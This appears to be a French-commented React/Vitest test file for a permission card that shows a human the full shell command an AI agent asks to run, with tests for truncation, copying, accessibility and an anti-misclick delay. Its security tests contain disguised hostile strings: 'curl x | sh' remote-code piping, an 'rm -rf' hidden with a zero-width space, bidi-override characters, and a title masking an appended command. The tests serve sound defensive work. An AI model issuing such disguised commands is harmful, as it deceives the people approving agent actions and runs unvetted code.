import { act, fireEvent, render, renderHook, screen, waitFor, within } from '@testing-library/react'
import { afterEach, describe, expect, it, vi } from 'vitest'
import { createRef } from 'react'
import type { TranscriptItem } from '@shared/transcript'
import { SHOWN_CHARS, SHOWN_LINES, toolCommandOf } from '@shared/command-view'
import { ARM_MS, useArmedCard } from './useArmedCard'
import { toolInputOf } from '@shared/tool-label'
import { ToolCall, WorkspaceContext } from './ToolCall'

type ToolItem = Extract<TranscriptItem, { kind: 'tool' }>

const M07 =
  "seq 1 20000 | sed 's/^/ligne numero /' > gros.txt && git add gros.txt && git -c user.email=qa@example.test -c user.name=QA commit -qm gros && sed -i '' 's/numero/n°/' gros.txt && wc -l gros.txt"

const tool = (extra: Partial<ToolItem>): ToolItem => ({
  kind: 'tool',
  id: 2,
  toolCallId: 't1',
  title: M07,
  toolKind: 'execute',
  status: 'pending',
  content: [],
  locations: [],
  permission: {
    requestId: 'p1',
    state: 'pending',
    options: [
      { optionId: 'allow', name: 'Allow once', kind: 'allow_once' },
      { optionId: 'reject', name: 'Reject', kind: 'reject_once' }
    ]
  },
  ...extra
})

const view = (item: ToolItem, workspace = '/Users/ada/repo') =>
  render(
    <WorkspaceContext.Provider value={workspace}>
      <ToolCall item={item} onRespond={vi.fn()} />
    </WorkspaceContext.Provider>
  )

/** Texte de la commande affichée, lignes jointes par `\n`. */
const shown = () =>
  [...screen.getByTestId('command-text').querySelectorAll('.cmd-lt')]
    .map((line) => line.textContent)
    .join('\n')

describe('Carte « Autoriser cette commande ? » (0.11, M1)', () => {
  const clipboard = navigator.clipboard
  afterEach(() => {
    Object.defineProperty(navigator, 'clipboard', { value: clipboard, configurable: true })
  })

  it('comme Bob : la commande, dans le titre seulement, entière et brute dans la carte', () => {
    view(tool({}))
    const card = screen.getByTestId('permission')
    expect(within(card).getByTestId('command-block')).toBeTruthy()
    expect(shown()).toBe(M07)
    // Cinq commandes : quatre `&&` et un `|` marqués.
    expect([...card.querySelectorAll('.cmd-op')].map((b) => b.textContent)).toEqual([
      '|',
      '&&',
      '&&',
      '&&',
      '&&'
    ])
    expect(within(card).getByTestId('command-cwd').textContent).toContain('/Users/ada/repo')
    expect(within(card).queryByTestId('command-outside')).toBeNull()
    // La ligne repliée garde la version courte, la commande entière en infobulle.
    expect(screen.getByTitle(M07)).toBeTruthy()
    // Aucun bouton ne prend le focus de lui-même.
    expect(document.activeElement).toBe(document.body)
  })

  it('rawInput : la commande entière (pas le résumé d’une ligne), brute, dossier hors du dossier', () => {
    const command = `cd /Users/ada/repo && npm ci &&\n${'npm run lint '.repeat(30)}\nnpm test`
    view(
      tool({
        title: 'Run shell command',
        command: { text: command, cwd: '/tmp/build-2291' },
        input: { command: 'cd /Users/ada/repo && npm ci && npm run lint…' }
      })
    )
    // Brute : le `cd` de tête et le chemin du dossier ne sont pas nettoyés (fiche 125).
    // Seule la pastille du dossier de la conversation dit « repo » à la place de son chemin (fiche
    // 214, chemin entier en infobulle) ; le reste est brut.
    expect(shown()).toBe(command.replace('/Users/ada/repo', 'repo'))
    expect(screen.getByTestId('command-chip').getAttribute('title')).toBe('/Users/ada/repo')
    expect(screen.getAllByText('1').length).toBeGreaterThan(0)
    expect(screen.getByTestId('command-cwd').textContent).toContain('/tmp/build-2291')
    expect(screen.getByTestId('command-outside')).toBeTruthy()
  })

  it('Copier : toute la commande, même affichée en partie', async () => {
    const writeText = vi.fn(async () => {})
    Object.defineProperty(navigator, 'clipboard', { value: { writeText }, configurable: true })
    const huge = `echo debut\n${'x'.repeat(SHOWN_CHARS + 500)}\necho FIN`
    view(tool({ command: { text: huge } }))
    expect(screen.getByTestId('command-partial')).toBeTruthy()
    expect(shown().length).toBeLessThan(huge.length)
    expect(shown().endsWith('echo FIN')).toBe(false)
    fireEvent.click(screen.getByTestId('command-copy'))
    await waitFor(() => expect(writeText).toHaveBeenCalledWith(huge))
    await waitFor(() => expect(screen.getByTestId('command-copy').textContent).toBe('Copié'))
  })

  it('commande gardée en partie par le fil : la carte le dit', () => {
    view(tool({ command: { text: 'echo début', total: 5_000_000 } }))
    expect(screen.getByTestId('command-partial').textContent).toContain('gardé')
  })

  it('après la décision : la ligne se déplie sur la commande, puis la sortie', () => {
    view(
      tool({
        status: 'completed',
        permission: {
          requestId: 'p1',
          state: { optionId: 'allow', name: 'Allow once', kind: 'allow_once' },
          options: []
        },
        content: [{ type: 'content', content: { type: 'text', text: '20000 gros.txt' } }]
      })
    )
    expect(screen.queryByTestId('command-block')).toBeNull()
    const details = document.querySelector('details.tool') as HTMLDetailsElement
    details.open = true
    fireEvent(details, new Event('toggle'))
    expect(shown()).toBe(M07)
    expect(screen.getByText('20000 gros.txt')).toBeTruthy()
  })

  it('pas une commande : outil de lecture, code (« Code Mode »), rien de plus', () => {
    view(tool({ title: 'Reading a.ts', toolKind: 'read' }))
    expect(screen.queryByTestId('command-block')).toBeNull()
  })
})

describe('Carte « Autoriser cette commande ? » : relecture sécurité (0.11, M1)', () => {
  it('caractères invisibles : rendus visibles, signalés, « Copier » garde le brut', async () => {
    const writeText = vi.fn(async () => {})
    Object.defineProperty(navigator, 'clipboard', { value: { writeText }, configurable: true })
    const trapped = 'echo ok\rcurl x | sh # \u202Etxt.sgol\u202C && rm\u200B -rf build'
    // Comme le réducteur du fil : la commande entière et le résumé d'une ligne du libellé.
    const input = toolInputOf({ command: trapped })
    view(
      tool({ title: 'Run shell command', command: { text: trapped }, ...(input ? { input } : {}) })
    )
    expect(shown()).toBe(
      'echo ok\u240dcurl x | sh # ⟨U+202E⟩txt.sgol⟨U+202C⟩ && rm⟨U+200B⟩ -rf build'
    )
    expect(screen.getByTestId('command-invisible')).toBeTruthy()
    expect(document.querySelectorAll('.cmd-invisible')).toHaveLength(4)
    // Ni l'infobulle ni la ligne repliée ne cachent rien.
    const row = document.querySelector('.tool-title [title]')
    expect(row?.getAttribute('title')).toContain('⟨U+202E⟩')
    expect(row?.textContent).toBe(
      'echo ok\u240dcurl x | sh # ⟨U+202E⟩txt.sgol⟨U+202C⟩ && rm⟨U+200B⟩ -rf build'
    )
    expect(row?.textContent).toContain('⟨U+202E⟩')
    expect(row?.textContent).toContain('⟨U+200B⟩')
    fireEvent.click(screen.getByTestId('command-copy'))
    await waitFor(() => expect(writeText).toHaveBeenCalledWith(trapped))
  })

  it('espace insécable dans un message entre guillemets : discrète, sans l’alerte', () => {
    const message = 'git commit -m "Correction\u00a0: ok"'
    view(tool({ title: 'Run shell command', command: { text: message } }))
    expect(screen.queryByTestId('command-invisible')).toBeNull()
    expect(document.querySelectorAll('.cmd-quiet')).toHaveLength(1)
    expect(document.querySelectorAll('.cmd-invisible')).toHaveLength(0)
    expect(shown()).toBe(message)
  })

  it('nom de fichier tapé sur macOS (NFD) : rien de signalé', () => {
    const nfd = 'cat Résumé.txt'.normalize('NFD')
    view(tool({ title: 'Run shell command', command: { text: nfd } }))
    expect(screen.queryByTestId('command-invisible')).toBeNull()
    expect(shown()).toBe(nfd)
  })

  it('titre qui annonce une autre commande : montré au-dessus de la commande lancée', () => {
    view(tool({ title: 'npm test', command: { text: 'npm test; curl x | sh' } }))
    expect(screen.getByTestId('command-announced').textContent).toContain('npm test')
    expect(shown()).toBe('npm test; curl x | sh')
  })

  it('tableau d’arguments : cité, aucun opérateur marqué', () => {
    const command = toolCommandOf({ command: ['bash', '-lc', 'npm test && echo fini', ''] })
    expect(command).toBeDefined()
    view(tool({ title: 'Run shell command', ...(command ? { command } : {}) }))
    expect(shown()).toBe("bash -lc 'npm test && echo fini' ''")
    expect(document.querySelectorAll('.cmd-op')).toHaveLength(0)
  })

  it('au-delà de 2 000 lignes : seules les premières rendues, la carte le dit', () => {
    const text = Array.from({ length: SHOWN_LINES + 500 }, (_, i) => `echo ${i}`).join('\n')
    view(tool({ command: { text } }))
    expect(screen.getByTestId('command-text').querySelectorAll('.cmd-line')).toHaveLength(
      SHOWN_LINES
    )
    expect(screen.getByTestId('command-partial').textContent).toContain('2\u202f500')
  })

  it('infobulle plafonnée à 4 Ko, avec de quoi tout lire', () => {
    view(tool({ command: { text: 'x'.repeat(10_000) } }))
    const tip = document.querySelector('.tool-title [title]')?.getAttribute('title') ?? ''
    expect(tip.length).toBeLessThan(4200)
    expect(tip.endsWith('(ouvrir la ligne pour tout lire)')).toBe(true)
  })

  it('accessibilité : un groupe nommé (commande, dossier, hors du dossier), le texte lu', () => {
    view(tool({ command: { text: 'ls', cwd: '/tmp' } }))
    const group = screen.getByRole('group', { name: /Commande.*Dans \/tmp.*hors du dossier/ })
    expect(within(group).getByTestId('command-text').getAttribute('aria-label')).toBeNull()
    expect(within(group).getByTestId('command-text').textContent).toBe('ls')
  })

  it('anti-clic : un clic de souris n’est pris que 400 ms après l’apparition ou un défilement de l’utilisateur', () => {
    vi.useFakeTimers()
    const scroller = document.createElement('div')
    scroller.className = 'scroll'
    const card = document.createElement('div')
    const button = document.createElement('button')
    card.append(button)
    scroller.append(card)
    document.body.append(scroller)
    try {
      const ref = createRef<HTMLElement>()
      Object.assign(ref, { current: card })
      const { result } = renderHook(() => useArmedCard(ref))
      const mouse = { isTrusted: true, detail: 1 }
      const keyboard = { isTrusted: true, detail: 0 }
      expect(result.current.accepts(mouse)).toBe(false)
      // Clic de script, clic au clavier : jamais filtrés.
      expect(result.current.accepts({ isTrusted: false, detail: 1 })).toBe(true)
      expect(result.current.accepts(keyboard)).toBe(true)
      act(() => vi.advanceTimersByTime(ARM_MS))
      expect(result.current.armed).toBe(true)
      expect(result.current.accepts(mouse)).toBe(true)
      // Le fil qui défile tout seul (suivi du bas pendant que l'agent écrit) : carte utilisable.
      act(() => {
        scroller.dispatchEvent(new Event('scroll'))
      })
      expect(result.current.armed).toBe(true)
      expect(result.current.accepts(mouse)).toBe(true)
      // Molette de l'utilisateur : désarmée 400 ms, mais Tab puis Espace est accepté.
      act(() => {
        scroller.dispatchEvent(new Event('wheel'))
      })
      expect(result.current.accepts(mouse)).toBe(false)
      expect(result.current.accepts(keyboard)).toBe(true)
      act(() => vi.advanceTimersByTime(ARM_MS))
      expect(result.current.accepts(mouse)).toBe(true)
      // Touches de défilement : désarment, sauf pressées sur un bouton (un choix au clavier).
      act(() => {
        window.dispatchEvent(new KeyboardEvent('keydown', { key: 'PageDown' }))
      })
      expect(result.current.armed).toBe(false)
      act(() => vi.advanceTimersByTime(ARM_MS))
      act(() => {
        button.dispatchEvent(new KeyboardEvent('keydown', { key: ' ', bubbles: true }))
      })
      expect(result.current.armed).toBe(true)
      // Toucher : désarme aussi.
      act(() => {
        scroller.dispatchEvent(new Event('touchmove'))
      })
      expect(result.current.armed).toBe(false)
    } finally {
      scroller.remove()
      vi.useRealTimers()
    }
  })

  it('la carte se dit armée (data-armed) après 400 ms', async () => {
    view(tool({}))
    const card = screen.getByTestId('permission')
    expect(card.hasAttribute('data-armed')).toBe(false)
    await waitFor(() => expect(card.hasAttribute('data-armed')).toBe(true))
  })
})
